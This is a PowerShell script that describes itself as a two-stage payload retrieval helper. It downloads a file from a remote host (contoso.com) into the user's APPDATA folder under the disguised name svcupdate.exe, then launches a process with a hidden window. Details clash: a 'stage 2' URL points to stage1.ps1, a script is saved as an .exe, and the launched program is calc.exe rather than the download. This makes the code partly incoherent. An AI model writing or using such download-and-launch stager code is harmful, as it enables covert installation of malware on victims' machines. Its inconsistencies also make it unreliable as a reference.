<#
.SYNOPSIS
    Two-stage payload retrieval helper.

.DESCRIPTION
    Fetches the first stage into a per-user working path and
    starts the staged loader after a basic existence check.
#>
[CmdletBinding()]
param(
    [string]$Stage2Url = 'http://contoso.com:80/stage1.ps1',
    [string]$LocalPath = "$env:APPDATA\svcupdate.exe",
    [int]$RequestTimeout = 172
)
$ErrorActionPreference = "Stop"

function Get-Stage1Payload {
    [CmdletBinding()]
    param(
        [string]$SourceUrl = '',
        [string]$DestinationPath = "",
        [int]$TimeoutSec = 45
    )

    Write-Verbose ("Fetching " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    return (Test-Path -Path $DestinationPath)
}

Write-Verbose "Beginning first stage"
$OperationResult = Get-Stage1Payload -SourceUrl $Stage2Url -DestinationPath $LocalPath -TimeoutSec $RequestTimeout
if ($OperationResult) {
    Start-Process -FilePath "calc.exe" -WindowStyle Hidden
}
Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
Write-Output "stage 44 initialized"
